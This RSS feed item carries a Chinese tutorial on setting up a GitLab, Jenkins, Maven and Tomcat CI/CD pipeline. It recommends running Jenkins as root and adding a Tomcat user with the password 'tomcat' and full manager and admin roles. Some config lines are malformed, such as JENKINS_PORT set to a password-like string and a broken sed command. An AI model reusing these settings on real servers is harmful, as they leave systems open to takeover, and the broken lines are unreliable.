<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Jenkins+GitLab+SonnarQube搭建CI/CD全流程 - MPolaris</title>
<link>http://www.cnblogs.com/mpolaris/p/14275351.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mpolaris/p/14275351.html</guid>
<description>&lt;h4 id=&quot;1-cicd&quot;&gt;1. CI/CD&lt;/h4&gt;
&lt;h5 id=&quot;11-ci---持续集成&quot;&gt;1.1 CI - 持续集成&lt;/h5&gt;
&lt;p&gt;持续集成（ Continuous integration ， 简称 CI ）指的是，频繁地（一天多次）将代码集成到主干。持续集成的目的就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是代码集成到主干之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。通过持续集成团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归功于持续集成。&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141036991-1833548477.png&quot; alt=&quot;image-20210110001719420&quot;/&gt;&lt;p&gt;持续集成的组成要素&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成的， 无需人工干预。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般使用SVN或Git。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;一个持续集成服务器， Jenkins 就是一个配置简单和使用方便的持续集成服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;12-cd---持续部署&quot;&gt;1.2 CD - 持续部署&lt;/h5&gt;
&lt;p&gt;持续部署则是在持续集成的基础上，把部署到生产环境的过程自动化。&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141116737-479850300.png&quot; alt=&quot;image-20210110002137822&quot;/&gt;&lt;h4 id=&quot;2-整体架构说明&quot;&gt;2. 整体架构说明&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;单体项目 / 前后端分离项目 解决方案&lt;/strong&gt;（已实现）&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110171535387-1465822161.png&quot; alt=&quot;image-20210110013036681&quot;/&gt;&lt;p&gt;&lt;strong&gt;微服务项目 解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141324655-71169397.png&quot; alt=&quot;image-20210110012819398&quot;/&gt;&lt;h4 id=&quot;3-gitlab代码管理私服&quot;&gt;3. GitLab代码管理私服&lt;/h4&gt;
&lt;h5 id=&quot;31-理解&quot;&gt;3.1 理解&lt;/h5&gt;
&lt;p&gt;GitLab和GitHub一样属于第三方基于Git开发的作品，免费且开源（基于MIT协议），与Github类似，可以注册用户，任意提交你的代码，添加SSHKey等等。不同的是GitLab是可以部署到自己的服务器上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放在别人的服务器上吧？简单来说可把GitLab看作个人版的GitHub。&lt;/p&gt;
&lt;h5 id=&quot;32-安装centos7&quot;&gt;3.2 安装(CentOS7)&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这里我使用的是Docker-compose安装，基于twang2218/gitlab-ce-zh汉化版镜像&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;version: '2'
services:
    gitlab:
      image: 'twang2218/gitlab-ce-zh'
      restart: unless-stopped
      hostname: '192.168.0.200'
      environment:
        TZ: 'Asia/Shanghai'
        GITLAB_OMNIBUS_CONFIG: |
          external_url 'http://192.168.0.200'
          gitlab_rails['time_zone'] = 'Asia/Shanghai'
          gitlab_rails['gitlab_shell_ssh_port'] = 2222
      ports:
        - '8089:80'
        - '8443:443'
        - '2222:22'
      volumes:
        - ./config:/etc/gitlab
        - ./data:/var/opt/gitlab
        - ./logs:/var/log/gitlab
volumes:
    config:
    data:
    logs:
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;33-相关配置&quot;&gt;3.3 相关配置&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 安装相关依赖
yum -y install policycoreutils openssh-server openssh-clients postfix
# 启动ssh服务&amp;amp;设置为开机启动
systemctl enable sshd &amp;amp;&amp;amp; sudo systemctl start sshd
# 设置postfix开机自启，并启动，postfix支持gitlab发信功能
systemctl enable postfix &amp;amp;&amp;amp; systemctl start postfix
# 开放ssh以及http服务，然后重新加载防火墙列表
firewall-cmd --add-service=ssh --permanent
firewall-cmd --add-service=http --permanent
firewall-cmd --reload
# 可以修改gitlab配置，配置文件已被挂载到Linux宿主机
vim /root/docker/gitlab/config/gitlab.rb
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;34-页面配置&quot;&gt;3.4 页面配置&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;管理员账号&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141430666-288992703.png&quot; alt=&quot;image-20210110015514060&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;添加组&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限，不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的管理。&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141454252-1785499032.png&quot; alt=&quot;image-20210110015921647&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;创建用户&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141544499-1165071770.png&quot; alt=&quot;image-20210110020138137&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;将用户添加到组中&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;17&quot;&gt;
&lt;p&gt;Gitlab用户在组里面有5种不同权限：&lt;/p&gt;
&lt;p&gt;Guest：可以创建issue、发表评论，不能读写版本库&lt;/p&gt;
&lt;p&gt;Reporter：可以克隆代码，不能提交，QA、PM可以赋予这个权限&lt;/p&gt;
&lt;p&gt;Developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限&lt;/p&gt;
&lt;p&gt;Maintainer：可以创建项目、添加tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个权限&lt;/p&gt;
&lt;p&gt;Owner：可以设置项目访问权限 - Visibility Level、删除项目、迁移项目、管理组成员，开发组组长可以赋予这个权限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141623672-1702069328.png&quot; alt=&quot;image-20210110020435952&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141637188-1608400229.png&quot; alt=&quot;image-20210110020643983&quot;/&gt;&lt;ol start=&quot;5&quot; readability=&quot;-2&quot;&gt;&lt;li&gt;
&lt;p&gt;组中创建项目&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;源码上传到Gitlab仓库（这里我们通过SSH的方式）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;登录GitLab私服地址：192.168.0.200:8089&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;配置SSH免密登录，以SSH方式push，pull代码&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;下载安装Git客户端&lt;/li&gt;
&lt;li&gt;打开Git Bash&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 配置Git使用者用户名
git config--global user.name “xxxx”
# 配置GIt 使用者邮箱
git config --global user.email “xxxx”
# 查看是否存在ssh keys
cd  ~/.ssh 
# 若出现”No such file or directory”，则表示需要创建一个ssh keys
ssh-keygen -t rsa -C &quot;你的邮箱&quot;  #邮箱写GitLab账户设置的邮箱
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;然后打开&lt;code&gt;~/.ssh/id_rsa.pub&lt;/code&gt;文件(~表示用户目录，比如我的windows就是C:\Users\Administrator)，复制其中的内容&lt;/li&gt;
&lt;li&gt;打开gitlab,搜索SSH Key，并把上一步中复制的内容粘贴到Key所对应的文本框，在Title对应的文本框中给这个sshkey设置一个名字，点击Add key按钮&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141721644-206827157.png&quot; alt=&quot;image-20210110022438786&quot;/&gt;&lt;ul&gt;&lt;li&gt;尝试拉取代码和提交代码，此时已不需要输入密码了&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;git clone ssh://git@192.168.0.200:2222/DianJianQiJu/jp-console.git
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;4-jenkins环境搭建&quot;&gt;4. Jenkins环境搭建&lt;/h4&gt;
&lt;h5 id=&quot;41-安装环境（centos7）&quot;&gt;4.1 安装环境（CentOS7）&lt;/h5&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;安装包&lt;/th&gt;
&lt;th&gt;版本号&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Jenkins&lt;/td&gt;
&lt;td&gt;jenkins-2.190.3-1.1.noarch.rpm&lt;/td&gt;
&lt;td&gt;2.190.3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;JDK&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;1.8&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Maven&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;3.6.2&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h5 id=&quot;42-jenkins安装与配置&quot;&gt;4.2 Jenkins安装与配置&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 把安装包上传到服务器，进行安装
rpm -ivh jenkins-2.190.3-1.1.noarch.rpm
# 修改Jenkins配置
vim /etc/syscofig/jenkins
JENKINS_USER=&quot;root&quot;
JENKINS_PORT=&quot;CenterSoft123&quot;
# 启动Jenkins
systemctl start jenkins
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;43-页面配置&quot;&gt;4.3 页面配置&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;第一次进入需要输入admin账户密码&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;cat /var/lib/jenkins/secrets/initialAdminPassword
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot; readability=&quot;0&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;选择插件来安装 =&amp;gt; 选择无 =&amp;gt; 安装。 以此来跳过插件安装，因为Jenkins插件需要连接默认官网下载，速度非常慢而且经过会失败，所以我们暂时先跳过插件安装&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;添加一个管理员账户，并进入Jenkins后台&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# Username
root
# Password
xxx
# Full name
root
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;JenKins URL默认即可&lt;/li&gt;
&lt;/ol&gt;&lt;h5 id=&quot;44-jenkins插件下载加速&quot;&gt;4.4 Jenkins插件下载加速&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;Jenkins本身没有提供多少功能，我们可以通过使用插件来满足我们的使用。例如从Gitlab拉取代码，使用Maven构建项目等功能需要依靠插件完成。接下来演示如何下载插件。&lt;/li&gt;
&lt;li&gt;修改Jenkins插件下载地址，Jenkins国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址。&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;enkins-&amp;gt;Manage Jenkins-&amp;gt;Manage Plugins，点击可选插件待其加载完成。这样做是为了把Jenkins官方的插件列表下载到本地，接着修改地址文件替换为国内插件地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141759393-1651443724.png&quot; alt=&quot;image-20210110024604394&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;cd /var/lib/jenkins/updates

sed -i 's#http:\/\/updates.jekins-ci.org\/download#https:\/\/mirrors.tuna.tsinghua.edu.cn\/jenkins#g' default.json

sed -i '#/http:\/\/www.google.com#https:\/\/www.baidu.com#g' default.json
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5.1428571428571&quot;&gt;
&lt;p&gt;最后，Manage Plugins点击Advanced，把Update Site改为国内插件下载地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json&quot; target=&quot;_blank&quot;&gt;https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Submit后，在浏览器输入： &lt;a href=&quot;http://192.168.66.101:8888/restart&quot; target=&quot;_blank&quot;&gt;http://192.168.66.101:8888/restart&lt;/a&gt; ，重启Jenkins。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;45-jenkins用户权限管理&quot;&gt;4.5 Jenkins用户权限管理&lt;/h5&gt;
&lt;p&gt;我们可以利用Role-based Authorization Strategy 插件来管理Jenkins用户权限&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Role-based Authorization Strategy插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141840300-2118556068.png&quot; alt=&quot;image-20210110025645710&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;开启权限全局安全配置&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Configure Global Security&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141903861-42310739.png&quot; alt=&quot;image-20210110025905790&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;创建角色&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Manage and Assign Roles -&amp;gt; Manage Roles&lt;/p&gt;
&lt;p&gt;Global roles（全局角色）：管理员等高级用户可以创建基于全局的角色&lt;/p&gt;
&lt;p&gt;Project roles（项目角色）：针对某个或者某些项目的角色&lt;/p&gt;
&lt;p&gt;Node roles（节点角色）：节点相关的权限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141934218-983967005.png&quot; alt=&quot;image-20210110030254595&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;我们添加以下三个角色&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;baseRole：该角色为全局角色。这个角色需要绑定Overall下面的Read权限，是为了给所有用户绑定最基本的Jenkins访问权限。注意：如果不给后续用户绑定这个角色会报错误：&quot;用户名 ismissing the Overall/Read permission&quot;&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110141953557-547579433.png&quot; alt=&quot;image-20210110030632431&quot;/&gt;&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;role1：该角色为项目角色。使用正则表达式绑定&quot;jp.*&quot;，意思是只能操作jp开头的项目。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;role2：该角色也为项目角色。绑定&quot;web.*&quot;，意思是只能操作web开头的项目。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142020776-20635314.png&quot; alt=&quot;image-20210110030818917&quot;/&gt;&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;创建用户&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Manage Users -&amp;gt; 新建两个用户如xixi / haha&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;给用户分配角色&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Manage and Assign Roles -&amp;gt; Assign Roles&lt;/p&gt;
&lt;p&gt;绑定规则如下：&lt;/p&gt;
&lt;p&gt;xixi用户绑定baseRole和role1角色，haha绑定baseRole和role2角色&lt;/p&gt;
&lt;p&gt;创建项目测试权限！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;46-jenkins凭证管理&quot;&gt;4.6 Jenkins凭证管理&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;凭据可以用来存储需要密文保护的数据库密码、Gitlab密码信息、Docker私有仓库密码等，以便Jenkins可以和这些第三方的应用进行交互。&lt;/li&gt;
&lt;li&gt;安装&lt;code&gt;Credentials Binding&lt;/code&gt;插件,要在Jenkins使用凭证管理功能，安装后Manage Jenkins出现如下菜单&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142044378-1811182476.png&quot; alt=&quot;image-20210110031507425&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;五种凭据类型&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# Username with password：用户名和密码

# SSH Username with private key： 使用SSH用户和密钥

# Secret file：需要保密的文本文件，使用时Jenkins会将文件复制到一个临时目录中，再将文件路径设置到一个变量中，等构建结束后，所复制的Secret file就会被删除。

# Secret text：需要保存的一个加密的文本串，如钉钉机器人或Github的api token

# Certificate：通过上传证书文件的方式
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;Jenkins管理Gitlab凭证 - 用户密码类型&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;安装Git插件。为了让Jenkins支持从Gitlab拉取源码，需要安装Git插件&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142116898-562414545.png&quot; alt=&quot;image-20210110031908618&quot;/&gt;&lt;ul&gt;&lt;li&gt;安装Git工具，为了让Jenkins支持从Gitlab拉取源码，需要在CentOS7上安装Git工具&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 安装
yum install git -y 
# 安装后查看版本
git --version 
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;创建用户密码类型凭证&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Manage Credentials -&amp;gt; 添加凭据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142145366-1353763992.png&quot; alt=&quot;image-20210110032453963&quot;/&gt;&lt;ul&gt;&lt;li&gt;测试凭证是否可用&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;创建一个自由风格的项目，找到&quot;源码管理&quot;-&amp;gt;&quot;Git&quot;，在Repository URL复制Gitlab中的项目URL。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142206595-540846795.png&quot; alt=&quot;image-20210110032659717&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142225307-950139421.png&quot; alt=&quot;image-20210110032908956&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142243313-306048158.png&quot; alt=&quot;image-20210110032927972&quot;/&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;查看&lt;strong&gt;/var/lib/jenkins/workspace/&lt;/strong&gt;目录，发现已经从Gitlab成功拉取了代码到Jenkins中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;Jenkins管理Gitlab凭证 - SSH类型&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 在Jenkins所在CentOS系统使用root用户生成公钥与私钥
ssh-keygen -t rsa
# 在/root/.ssh/目录保存了公钥和私钥
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;把生成的公钥放在Gitlab中。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;以root账户登录-&amp;gt;点击头像-&amp;gt;Settings-&amp;gt;SSH Keys。复制刚才id_rsa.pub文件的内容到这里，点击&quot;Add Key&quot;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;在Jenkins中添加凭证，配置私钥&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在Jenkins添加一个新的凭证，类型为&quot;SSH Username with private key&quot;，把刚才生成私有文件内容复制过来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142304602-1588408373.png&quot; alt=&quot;image-20210110033708635&quot;/&gt;&lt;h5 id=&quot;47-maven安装和配置&quot;&gt;4.7 Maven安装和配置&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;在Jenkins集成服务器上，我们需要安装Maven来编译和打包项目。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;&lt;li&gt;
&lt;p&gt;安装Maven&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置环境变量&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;vim /etc/profile

export MAVEN_HOME=/home/apache-maven-3.5.4
export PATH=${PATH}:${MAVEN_HOME}/bin

export JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk
export JRE_HOME=$JAVA_HOME/jre
export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin

# 使环境变量生效
source /etc/profile

#查看Maven版本
mvn -v 
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;全局工具配置关联JDK和Maven&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Jenkins -&amp;gt; Global Tool Confifiguration -&amp;gt; JDK-&amp;gt;新增JDK&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142331089-910573811.png&quot; alt=&quot;image-20210110034220985&quot;/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Jenkins-&amp;gt;Global Tool Confifiguration-&amp;gt;Maven-&amp;gt;新增Maven&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142353468-808290115.png&quot; alt=&quot;image-20210110034329697&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;添加Jenkins全局变量&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins-&amp;gt;Confifigure System-&amp;gt;Global Properties ，添加三个全局变量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142427571-1643160932.png&quot; alt=&quot;image-20210110034512889&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;修改Maven的settings.xml&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 创建本地仓库目录
mkdir /root/repo 
# 修改本地仓库路径
vim /opt/maven/conf/settings.xml

/root/maven_repository

# 添加阿里云私服地址
alimaven aliyun maven http://maven.aliyun.com/nexus/content/groups/public/ central
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;测试Maven是否配置成功&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;使用之前的测试项目，修改配置&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142454661-767595134.png&quot; alt=&quot;image-20210110034912951&quot;/&gt;&lt;ul&gt;&lt;li&gt;构建 -&amp;gt; 增加构建步骤 -&amp;gt; Execute Shell&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142514438-1382670707.png&quot; alt=&quot;image-20210110035056063&quot;/&gt;&lt;ul&gt;&lt;li&gt;再次构建，如果可以把项目打成war包，代表maven环境配置成功！&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142536094-117147938.png&quot; alt=&quot;image-20210110035209898&quot;/&gt;&lt;h5 id=&quot;48-tomcat安装与配置&quot;&gt;4.8 Tomcat安装与配置&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这里使用的是window服务器。配置与Linux服务器并无差异&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;&lt;li&gt;安装Tomcat8.5&lt;/li&gt;
&lt;li&gt;配置Tomcat用户角色权限&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;默认情况下Tomcat是没有配置用户角色权限的。但是，后续Jenkins部署项目到Tomcat服务器，需要用到Tomcat的用户，所以修改tomcat以下配置，添加用户及权限。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110142631065-745490080.png&quot; alt=&quot;image-20210110035636656&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!-- 进入 tomcat的conf/tomcat-users.xml添加如下配置 --&amp;gt;
&amp;lt;role rolename=&quot;tomcat&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;role1&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;manager-script&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;manager-gui&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;manager-status&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;admin-gui&quot;/&amp;gt; 
&amp;lt;role rolename=&quot;admin-script&quot;/&amp;gt; 
&amp;lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,tomcat,admin-gui,admin-script&quot;/&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
